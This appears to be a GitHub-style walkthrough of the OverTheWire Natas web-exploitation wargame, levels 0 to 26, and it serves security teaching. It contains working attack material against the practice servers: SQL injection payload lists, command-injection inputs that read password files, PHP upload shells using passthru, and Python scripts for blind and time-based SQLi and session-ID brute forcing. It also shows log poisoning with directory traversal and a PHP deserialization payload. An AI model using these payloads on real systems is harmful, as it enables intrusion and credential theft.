# natas
natas is a wargame from OverTheWire based on Web Exploitatioin. The link is https://overthewire.org/wargames/natas/

# Rules
1. Password for natas0 is natas0
2. Find password for next natas level within the current website
3. Next website level is (example) http://natas5.natas.labs.overthewire.org/, just change 5 to 6, etc.

**NOTE:** The password may differ for each user but the mathod remains same. Thus these are just the solutions, passwords will not be mentioned.
## Level0 - natas0
Open the Inspect Element, and there you go. You have the password just there. <br>

## natas1
You can't right click, ok. 
Simply open this FireFox and Cmd U, that will open the Source Code. There you go, the password is just right there.

## natas 2
View source page and find that there’s a folder `/files/` on the web root. Inside this folder there’s a file named as `users.txt`. Open it and find the password.

## natas 3
View source page and find that Not even Google will find it this time. It looks like that there’s something to do with the search engines.
<br>

Try to open the `/robots.txt` and find that the website disallows the folder `/s3cr3t/` to be crawled. Open the folder and find the password in the file `user.txt`.

## natas4
The message clearly shows we need to use BarpSuite. 
<br>
When we open Proxy, We see referrer to be based on natas4, but the website wants referrer to be `http://natas5.natas.labs.overthewire.org/`.
<br>
When you change and forward it, you get the password. 

## natas5
Well you can't find in Inspect element or if you search around. Well whenever you are not logged in and you can't enter anywhere anything. 2 options most common- 1) Cookies 2) Barpsuite. 
<br>Here go to the cookies and you see `loggedin` is 0. Just change it to 1, refresh and you get the password!

## natas6
You try few things - 
1. SQLi, like `' OR 1=1` or `admin'--`, none of these work. (I tried since word `Query` was written.)
2. You see the source code. You find `includes/secret.inc`. You put it in the website link as `.../includes/secrets.inc`, you get nothing.
3. An empty website is always sus. You check Source Code and you see the secret password!
```php
<?
$secret = "...";
?>
```
Now just put this secret in the original website and you get the password for the next level.

## natas7
In the source code URL, you see
```
view-source:http://natas7.natas.labs.overthewire.org/index.php?page=home
```
This shows us the home page. As mentioned, just change home to 
```
view-source:http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```
and you get the password! This is php, you should know somethings on how it works.

## natas8
This one is straight up reverse ciphering. From the source code, we get the `submit` is what we input, which is passed through series of changes to finally get the hexadecimal `encodedSecret`.<br>
This we perform the below operations to `encodedSecret`.
1. Hex to Text (because of `bin2hex`)
2. Reverse it (because of `strrev`)
3. base64 decode (because of `bas64_encode`)
We get a text, which we input in the box, and you get the password for natas9!

## natas9

This one is good. From the source code given, we can see it is operating a terminal command, and the first that comes to mind is the use of `;`. So we try `hello; ls`. And very well it gives output as `dictionary.txt`. <br>

But the problem is that you try around various possibilities of ls, but it wont get us the password. One thing left is to try extracting password like `; cat /etc/natas_webpass/natas10`. This gives us the password and we are done. This is sort of unintuitive, but these are how you exploit such vulnerabilities. Sometimes they are designed to let you pass these.

## natas10
Since we have restrictions this time, we cannot try anything particular. But then we can output everything right! So we run
```bash
.*
```
This will print out everything that is there. But we yet didnt get our password. So we give the location we want as-
```bash
.* /etc/natas_webpass/natas11
```
And sure enough we see our password in `/etc/natas_webpass/natas11`.

## natas11
For cipher lovers, this one is a bonus. Here we are given with a source code which explains how the encryption is done. We see `array( "showpassword"=>"no", "bgcolor"=>"#ffffff");` present and we must change no to yes.
<br>Notice the cookies, you have `data` having some text written, according to the source code, that cookie is basically the above array but in encryption. So our task is to find the key of XOR, and use it to decode the above array again, but with a yes.
<br>

**CORE CONCEPT:** let A, B, C be 3 texts such that `A XOR B = C`, then `B XOR C = A`, `C XOR A = B`. This is the vulnerability of XOR.
<br>
We follow the below steps- 
1. Convert the above to json(since the code uses json_decode)
We get `{"showpassword":"no","bgcolor":"#ffffff"}` (UTF-8)
2. We decode base64 for the cookie data ( which has %3D or something at the end).
3. We XOR that with the above json, to get the key. (You can use Cyber Chef)
Notice that the key is repeating, well good for you. Just extract that common part and use it.

4. Put XOR key as the 4 letter common part and above json with "yes". (UTF-8)
5. We take the new text and base64 encode it.
6. We get a big cookie text which is very similar to our original cookie.
7. We input this to the cookie as the new cookie, refresh.

And we have the new password. This was indeed tough to understand the code, since we may not be familiar with PHP.

## natas12
When we read the code, we understand the following things-
1. Whatever filename we give, it is gonna change it to some random 10 letter string
2. It changes filetype to .jpg
3. It uploads the file and php automatically executes it, when you open the link. (Hence php is useful)

So we write a php code as `file.php`, with the following content-
```php
<?php
echo passthru('cat /etc/natas_webpass/natas13');
?>
```
This is supposed to give us the password. (Please search google on how to run a code of terminal using php)<br>
Now the main part. Since it converts it to jpg, we need to prevent that, else there is no use of execution. And Barpsuite is the best tool to do this.<br>
Open Barpsuite and in Proxy after you click Upload file, you see the new name of the file made as `some10letr.jpg`, just convert that to `.php` and you are done. This will show success upload file and when you click on the link, you get the password to the next level!

## natas13
This one is the same as above. Have the same file ready. 
<br>
Now ask GPT how exactly it checks for the image type based on that 1 line in source code. Then you get to know that if the hexdump of an image does not start with magic hex which in text is BMP, then it counts as an image.<br>
Thus you can simply do-
```php
BMP<?php
echo passthru('cat /etc/natas_webpass/natas14');
?>
```
And this works. You can upload it as usual, do the same changes in BARPSUITE as natas12(.jpg -> .php) and you are done.
You can also change the hex of the file(compare with real jpg file and copy the initial few Hex's)

**Beware:** The text you get may not work. Why? Cause you have BMP in the beginning. Remove that and you are good to go.(It was a shocker to me why that didn't work initially)

## natas14
Now this is an SQLi problem. We try the regular expressions with password first. We try the below list in general-
```markdown
1. admin' --
2. admin' #
3. admin'/*
4. ' or 1=1--
5. ' or 1=1#
6. ' or 1=1/*  
7. ') or '1'='1--
8. ') or ('1'='1--
```
Now use it on both password and username, but with double quotes(`"`)since source code uses `"`. And it turns out the correct ans is `username= point 5` and `password=anything`.

## natas15
The first we see the Source code, which tells us we only have `username` where we can try SQLi. 
Now when we put `natas15`, the user doesn't exist but `natas16` does. This gives us the clue that we may get the password of natas16 using natas16. By that I mean, if i am in natas15, i can see the password of natas15 in Source code. 
<br>
Now here is a concept of SQL wer should know. If we want to guess that if username="something" and password has "a" or begins with "a". We use the below idea-

```sql
-- EXAMPLE
-- when we want "a" to exist somewhere in password
select * from users where username="name" and password like "%a%"; 
-- when we want password to start with "test"
select * from users where username="name" and password like "test%"; 
-- when we want password to end with "test"
select * from users where username="name" and password like "%test"; 
-- The dollar assume "anything" plus "your_given_string"
```
Since the source code mentions we have table with username(64 char max) and password(64 char max),
This case is called BLIND SQLi, cause we can't figure out what to do. Nothing usual works.<br>
Now we will write a python code using 2nd example which will give us the password. This is basically brute forcing the password.
<br>
The code useful will be-

```python
import requests
import string

url = 'http://natas15.natas.labs.overthewire.org/'
auth = ('natas15', '<password>')  # replace <password> with the actual password
characters = string.ascii_letters + string.digits
known_password = ''

session = requests.Session()
session.auth = auth

for i in range(32):  # assuming the password is 32 characters long
    for char in characters:
        sql = f'natas16" AND password LIKE BINARY "{known_password}{char}%'
        response = session.get(url, params={'username': sql})
        if 'This user exists.' in response.text:
            known_password += char
            print(known_password)
            break

print(known_password)
```
This code will print out the password for natas16 and we are done.

## natas16
Here it is similar to natas10, but more characters are restricted. If you try anything normal, it won't work. Well one more trick up our sleeves it, like natas15, check if each character comes in natas17's password or not, using `grep`. This will work since if the char is not, then it will output the dictionary list, else it will output nothing. And we are looking for the case nothing is outputted. 
<br>
This is again a brute force. This is called BLIND COMMAND INJECTION. The code which will work is-

```python
import requests
import string

url = 'http://natas16.natas.labs.overthewire.org/'
auth = ('natas16', '<password>')  # replace <password> with the actual password
characters = string.ascii_letters + string.digits
known_password = ''

session = requests.Session()
session.auth = auth

for _ in range(32):  # assuming the password is 32 characters long
	for char in characters:
		command = f'$(grep ^{known_password}{char} /etc/natas_webpass/natas17)'
		response = session.get(url, params={'needle': command}) 
		if 'April' not in response.text:  # 'April' is a word that appears in the normal output
			known_password += char
			print(known_password)
			break

print(known_password)
```
This will output the password and we are done!

## natas17
In the source code, we do not see anything being printed when the user exists or not. So what do we do?
Well let's try another form of SQLi, called Time based SQLi, where since we do not get any printed response, we can check the existance of user if time elapsed matches our input elapse time. For example-
```sql
hi" and sleep(2); # -- gives no time elapse
natas18" and sleep(2); # -- gives 2 seconds gap before going to next screen
```
We can use this to check the session time and brute force each character. The python code for this is-
```python
import requests
import string

url = 'http://natas17.natas.labs.overthewire.org/'
auth = ('natas17', '<password>')  # replace <password> with the actual password
characters = string.ascii_letters + string.digits
known_password = ''

session = requests.Session()
session.auth = auth

for _ in range(32):  # assuming the password is 32 characters long
    for char in characters:
        sql = f'natas18" AND IF(password LIKE BINARY "{known_password}{char}%", SLEEP(2), null) #'
        response = session.post(url, data={'username': sql})
        if response.elapsed.total_seconds() > 2: # you can choose some other time too.
            known_password += char
            print(known_password)
            break

print(known_password)
```
This will give us our password and we are set to go for the next round.

**NOTE:** This takes a lot of time, so one trick that can be done is that check which all characters satisfy our password, then among them reorder for the password. This will reduce number of checking. The code for the above is-
```python
import requests
import string
pwd_len = 32

charset_0 = string.ascii_letters + string.digits
charset_1 = ''

target = 'http://natas17.natas.labs.overthewire.org/'
auth = ('natas17', '<password>')  # replace <password> with the actual password
sleep_time = 5

for c in charset_0:
	username = 'natas18" AND IF(password LIKE BINARY "%%%c%%",SLEEP(%d), 1)#' % (c, sleep_time)
	r = requests.get(target, auth=auth, params={"username": username}
	)
	s = r.elapsed.total_seconds()
	if s >= sleep_time:
		charset_1 += c
		print ('C: ' + charset_1.ljust(len(charset_0), '*'))


password = ""
while len(password) != pwd_len:
	for c in charset_1:
		t = password + c
		username = 'natas18" AND IF(password LIKE BINARY "%s%%",SLEEP(%d), 1)#' % (t, sleep_time)
		r = requests.get(target, auth=auth, params={"username": username}
		)
		s = r.elapsed.total_seconds()
		if s >= sleep_time:
			print ('P: ' + t.ljust(pwd_len, '*'))
			password = t
			break

print(password)
```

## natas18
Let's open the source code and we see, logging in as admin wont do us good since it is considered unsafe. But we also see that `PHPSESSID` is a cookie which tells us if we logged in as a regular person or admin. Well that's our first clue. We launch BurpSuite, before forwading set an attack using Intruder which checks for `PHPSESSID` from 0 to 640(max limit). <br>
This is how we do it-<br>
1. set `username=admin` and `password=anything` and submit.
2. Forward request once, the next proxy content will show us `PHPSESSID` as 237(maybe different for you).
3. Highlist 237 and send it to Intruder. 
4. In Payloads, set payload as `Numbers` from 0 to 640.
5. In Settings, set Grep match list with suitable content from source code to land a hit if PHPSESSID is correct.
6. Wait a while.

Now you get your `PHPSESSID=`(maybe different for you) which will logs us in as admin and you got your password. <br>

## Approach 2(faster)
Use python coding for the same, with multithreading. This will take almost same time for each thread( i.e. in 1 second earlier if you were getting 1 response, now you get 6)(approx 1 seconds).<br>
So the code is-
```python
import requests
import threading

def try_session_ids(start, end):
	target = 'http://natas18.natas.labs.overthewire.org'
	auth = ('natas18','<password>')
	params = dict(username='admin', password='s3cr3t')
	cookies = dict()

	for s_id in range(start, end):
		print ("Trying with PHPSESSID = " + str(s_id))
		cookies = dict(PHPSESSID=str(s_id))
		r = requests.get(target, auth=auth, params=params, cookies=cookies)
		if "You are an admin" in r.text:
			print (r.text)
			break

threads = []
for i in range(0, 601, 100):
	thread = threading.Thread(target=try_session_ids, args=(i, i+100))
	thread.start()
	threads.append(thread)

for thread in threads:
	thread.join()
```
If you don't get a response here, try from 601 to 640 and you are done. This is really fast approach to this problem.

## natas19
This problem is same as before but now the cookie is very complex looking. But not as much since it looks like hex. When you convert hex to text, we get `38-admin` (number might be different for you). Well that's the hit. We change the number 38 from 0 to 640, convert back to hex and try which one hits.
<br>The python code which works is-

```python
import requests
import binascii
import threading
url = 'http://natas19.natas.labs.overthewire.org/'
auth = ('natas19', '<password>')  # replace with the actual password

session = requests.Session()
session.auth = auth
def try_session_ids(start, end):
	for session_id in range(start, end):  # the session ID is between 1 and 640
		print(f'Trying session ID: {session_id}')
		session_cookie = f'{session_id}-admin'.encode()
		session_cookie = binascii.hexlify(session_cookie).decode()
		cookies = {'PHPSESSID': session_cookie}
		response = session.get(url, cookies=cookies)
		if 'You are an admin' in response.text:
			print('Found the admin session ID:', session_id)
			print(response.text)
			break

threads = []
for i in range(0, 601, 100):
    thread = threading.Thread(target=try_session_ids, args=(i, i+100))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
```
And you get a hit within few seconds. 

## natas20
For this problem, the source code has lot of rubbish written but we must focus on satisfying one key line which is -
```php
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
...
}
```
Here it says we should have Session name as admin and session's admin value also 1. To achieve this, lets understand the below code-
```python
import requests

url = 'http://natas20.natas.labs.overthewire.org/index.php?debug'
auth = ('natas20', '<password>')  # replace with the actual password

session = requests.Session()
session.auth = auth

# Step 1: Create a new session and inject our payload
data = {'name': 'admin\nadmin 1'}
response = session.post(url, data=data)

# Step 2: Use the same session to view the page again
response = session.get(url)

if 'You are an admin' in response.text:
    print('Success! Here is the response:')
    print(response.text)
else:
    print('Failed to get admin access.')
```
This script first creates a new session and sends a POST request with a payload that injects a new line and 'admin 1' into the 'name' parameter. This causes the server to treat 'admin 1' as a separate session variable when it reads the session data. Then, it sends a GET request with the same session to view the page again. If the server treats 'admin 1' as a session variable, it will consider the user to be an admin.

## natas21
This problem is similar to natas20, but we now have to input admin=1 ourselves and match the cookies from experimenter website to the original website. The python code for this is-

```python
import requests

# URLs for both sites
url = 'http://natas21.natas.labs.overthewire.org/index.php'
experimenter_url = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php'

auth = ('natas21', '<password>')  # replace with the actual password

session = requests.Session()
session.auth = auth

# Step 1: Set the admin variable to 1 on the experimenter site
data = {'admin': '1', 'submit': 'Update'}
response = session.post(experimenter_url, data=data)

# Get the PHPSESSID from the response cookies
phpsessid = response.cookies['PHPSESSID']

# Step 2: Use the same PHPSESSID to view the main site
cookies = {'PHPSESSID': phpsessid}
response = session.get(url, cookies=cookies)

if 'You are an admin' in response.text:
    print('Success! Here is the response:')
    print(response.text)
else:
    print('Failed to get admin access.')
```
We submit admin=1 in the experimenter website which gives us the proper info and cookie, which is now submitted to main url. Since both are colocated, this works and we get our password.

## natas22
This is easy. Notice when everything is submitted as before(with or without cookie), we are being redirection to some `Location`. In the docs of `requests` library in python, it says we can disallow redirects. Thus our code becomes-
```python
import requests

# URLs for both sites
url = 'http://natas22.natas.labs.overthewire.org/index.php'

auth = ('natas22', '<password>')  # replace with the actual password

session = requests.Session()
session.auth = auth

# Step 1: Set the admin variable to 1 on the experimenter site
data = {'admin': '1'}
response = session.post(url, data=data)
params = {'revelio': ''}    

response = session.get(url,params=params, data=data, allow_redirects=False)

if 'You are an admin' in response.text:
    print('Success! Here is the response:')
    print(response.text)
else:
    print('Failed to get admin access.')
```

### Note about PHP
In PHP, data that is sent via a GET request is typically accessed through the $_GET superglobal array, while data sent via a POST request is accessed through the $_POST superglobal array.

If you see something like $_GET['param'] in the PHP code, that means the param is expected to be in the URL query string, and you would send it as a parameter (params) in your Python requests.

If you see $_POST['data'], that means the data is expected to be in the request body, and you would send it as data (data) in your Python requests.

In CTF's, they may go against this common idea to set up the problem, just like you can see in our previous codes.

# natas23
If you search what `strstr()` does, you will know that it checks for the first occurence of the string. Here it is used so that it checks if `iloveyou` is present and nothing is after it. Thus we can input `1234iloveyou` which has length >10. And we get the password

## natas24
If you read about `strcmp`, it messed up when you compare it with non string values. When you enter an empty array, it returns NULL or 0, which is exactly what we want. But if we input `[]`, it will be taken as `"[]"`, which is not what we want.
Thus you can simply change the link from `passwd=` to `passwd[]=[]` i.e. no need to input anything simply change the link and we are done. 

## natas25
This problem deals with a new concept.<br>
The Natas25 challenge involves exploiting two vulnerabilities: Directory Traversal and Log Poisoning.
1. **Directory Traversal:** This is a vulnerability that allows an attacker to read arbitrary files on the server's file system. In this challenge, the application includes a language file specified by the lang parameter in the response. By using a relative path like `....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_`, we can escape from the current directory and read files from other directories.

2. **Log Poisoning:** This is a vulnerability that allows an attacker to inject malicious content into a system's log files. In this challenge, the application logs the user agent string of each request. By setting the user agent string to PHP code, we can inject this code into the log file. When the log file is included in the response, the server executes this code.

The solution to this challenge involves combining these two vulnerabilities.<br> 
- First, we inject PHP code into the user agent string that reads the password for the next level.
- Then, we use directory traversal to include the log file in the response. When the server includes the log file, it executes the injected PHP code, revealing the password for the next level.

You can either use python or Barpsuite for this. The below is the code you can use for python-
```python
import requests

# URL for the site
url = 'http://natas25.natas.labs.overthewire.org/'

auth = ('natas25', '<password>')  # replace with the actual password

# Create a session
session = requests.Session()
session.auth = auth

# Set the user agent to include PHP code
session.headers['User-Agent'] = '<?php echo file_get_contents("/etc/natas_webpass/natas26"); ?>'
session.get(url)

if 'PHPSESSID' not in session.cookies:
    # Manually set the PHPSESSID cookie
    session.cookies['PHPSESSID'] = '<cookie-value>'
# Make a GET request to the site with the lang parameter set to include the log file
response = session.get(url, params={'lang': '....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_' + session.cookies['PHPSESSID'] + '.log'})

# Print the response
print(response.text)
```
We didnt use `/etc/natas_webpass/natas26` since the source code filters out the results and we are even given with what we can inject to get our password which is the above `var/...`. Also usually to get `/etc/passwd`, we do 5 `../` in sequence(just a general trend, it may also be different), but since we cant use `../` directly, we used `....//` which converts itself too `../` according to source code and we are done.

## natas26
This problem is based on deserialization. If you open the cookies, you see `drawing` cookie which is base64 encoded, and when you decode it, you see php arrays and serials for each image you creat with data as x1, x2, etc. When you open the source code, th `Logger` class creates "magic functions" `__construct` and `__destruct` which you can do serialization and unserialization of (read about php class log serializations.)

So our goal will be to make a cookie which will be unserialized by the server and regarded as Logger. This will be executed to fetch our password from `/etc/natas_webpass/natas27`. So let's build the cookie-
```php
<?php
class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;
    function __construct($file)
    {
        // initialise variables
        $this->initMsg="Hello\n";
        $this->exitMsg="Goodbye <? passthru('cat /etc/natas_webpass/natas27'); ?>\n\n";
        $this->logFile = "img/password.php";
    }
}
$object = new Logger("Security Times");
echo "Serialized Object : ".serialize($object)."<pre>\n\n</pre>Base64 encoded serialized object : ".urlencode(base64_encode(serialize($object)));
?>
```
The above codes creates an object of class `”Logger“`. Creation of an object sends a call to `__construct()` function which executes our command and stores the result in `img/password.php` file.
Now what we do to get the appropriate cookie is to make a php file with above conde in it, run -
```bash
php natas26_phpcode.php
```
And we get the serialized object + basee64 encoded version too, which is inputted as drawing cookie and refreshed. Now traverse to `/img/password.php` and you get your password for the next level.
